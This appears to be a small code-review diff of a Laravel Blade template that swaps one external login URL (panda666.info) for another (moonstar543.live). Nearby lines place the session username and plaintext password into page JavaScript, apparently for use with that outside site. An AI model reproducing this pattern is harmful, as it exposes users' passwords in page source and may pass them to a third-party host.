@@ -113,7 +113,7 @@
 <script>
   var errorMessage = @json(session('error'));
   var successMessage = @json(session('success'));
-  var url = 'https://panda666.info/login';
+  var url = 'https://moonstar543.live/login';
   var name = @json(session('username'));
   var pw = @json(session('password'));
 
